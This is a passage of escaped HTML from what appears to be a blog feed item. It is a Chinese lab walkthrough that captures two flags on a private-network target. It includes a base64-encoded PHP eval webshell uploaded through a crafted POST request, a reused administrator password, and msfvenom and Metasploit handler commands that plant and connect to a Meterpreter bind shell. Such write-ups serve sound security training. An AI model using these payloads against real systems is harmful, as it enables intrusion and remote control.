+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Content&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;62&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOyA&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Pg&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115126202.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nl"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//192.168.10.10/preview/19e38733df609cc8a1e512d9450bd200.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115527440.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+
+&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115604118.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;go-flag{kn6anDUCzBqtjlX8}&lt;/p&gt;
+&lt;h1 id="flag2"&gt;flag2&lt;/h1&gt;
+&lt;p&gt;配置文件中翻到 可以进行密码复用，先放着&lt;/p&gt;
+&lt;p&gt;administrator cyberstrike@2024&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260520115853553.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;生成正向木马,因为这个靶场不出网&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o 4444.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703222909081.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;蚁剑上传到可执行目录&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260703172335838.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;目标服务器可被攻击者访问，但攻击者主机因处于内网无公网 IP，因此选择正向连接模式。设置正向连接，是我们主动去连接目标主机的4444端口&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;use&lt;/span&gt; &lt;span class="n"&gt;exploit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;multi&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;handler&lt;/span&gt;  &lt;span class="c1"&gt;# 启用监听模块&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="n"&gt;windows&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;x64&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;meterpreter&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bind_tcp&lt;/span&gt;  &lt;span class="c1"&gt;# 匹配生成木马时的payload``&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;RHOST&lt;/span&gt; &lt;span class="mf"&gt;192.168&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;10.10&lt;/span&gt;  &lt;span class="c1"&gt;# 目标服务器IP地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;LPORT&lt;/span&gt; &lt;span class="mi"&gt;4444&lt;/span&gt;  &lt;span class="c1"&gt;# 匹配木马中设置的监听端口``&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;run&lt;/span&gt;  &lt;span class="c1"&gt;# 启动监听&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;同时运行这个4444.exe&lt;/p&gt;</description></item></channel></rss>
